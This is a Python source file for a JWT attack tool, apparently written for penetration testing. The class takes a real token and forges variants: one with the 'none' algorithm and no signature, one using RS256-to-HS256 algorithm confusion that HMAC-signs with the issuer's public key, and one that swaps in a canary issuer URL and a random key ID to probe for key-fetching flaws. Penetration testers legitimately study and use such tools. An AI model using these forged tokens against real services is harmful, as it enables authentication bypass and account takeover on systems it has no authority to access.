import requests
import json
import base64
import sys
import jwt
from jwt import PyJWKClient
from jwt.algorithms import RSAAlgorithm
from cryptography.hazmat.primitives import serialization
import hashlib
import hmac
import random
import string

class Jwty(object):

    def __init__(self,t):
        parts = t.split(".")
        self.header = jwt.get_unverified_header(t)
        self.payload = jwt.decode(t,options={"verify_signature":False})
        self.signature = parts[2] if len(parts) > 2 else None
        self.encoded = t
        self.errors = []
        self.public_key = self._get_public_key()
    
    
    def _get_public_key(self):
        if self.header["alg"][:2] == "RS":
            try:
                wk_res = requests.get(self.payload["iss"] + "/.well-known/openid-configuration")
                jwks_uri = wk_res.json()["jwks_uri"]
                jwks_client = PyJWKClient(jwks_uri)
                return jwks_client.get_signing_key_from_jwt(self.encoded).key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
            except Exception as ex:
                self.errors.append("Error getting public Key: {0}".format(str(ex)))
        return None

    def AsAlgNone(self):
        header = {
            "alg": "none",
            "typ": "JWT"
        }

        eh = base64.urlsafe_b64encode(json.dumps(header).encode()).strip(b'=')
        ep = base64.urlsafe_b64encode(json.dumps(self.payload).encode()).strip(b'=')
        return "{0}.{1}.".format(eh.decode(),ep.decode())


    def AsAlgHS256(self):
        if self.public_key:
            header = {
                "alg": "HS256",
                "typ": "JWT"
            }

            eh = base64.urlsafe_b64encode(json.dumps(header).encode()).strip(b'=')
            ep = base64.urlsafe_b64encode(json.dumps(self.payload).encode()).strip(b'=')
            sig = base64.urlsafe_b64encode(hmac.new(self.public_key, eh + b'.' + ep, hashlib.sha256).digest().strip()).strip(b'=')

           
            return "{0}.{1}.{2}".format(
                eh.decode(),
                ep.decode(),
                sig.decode()
            )

        msg = "No RSA Public Key Found!\n"
        if len(self.errors) > 0:
            msg += "\n".join(self.errors)
        return msg
    
    def WithCanaryIss(self,canary): 
        header = self.header
        payload = self.payload
        if "kid" in header.keys(): 
            header["kid"] = "".join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(43))
            payload["iss"] = "{0}oauth2/lidukgiq45hkkpxfucuq5b1qo".format(canary)
            eh = base64.urlsafe_b64encode(json.dumps(header).encode()).strip(b'=')
            ep = base64.urlsafe_b64encode(json.dumps(payload).encode()).strip(b'=')
            return "{0}.{1}.{2}".format(
                eh.decode(),
                ep.decode(),
                self.signature
            )
        else: 
            return "No Kid found. A Canary won't work..."





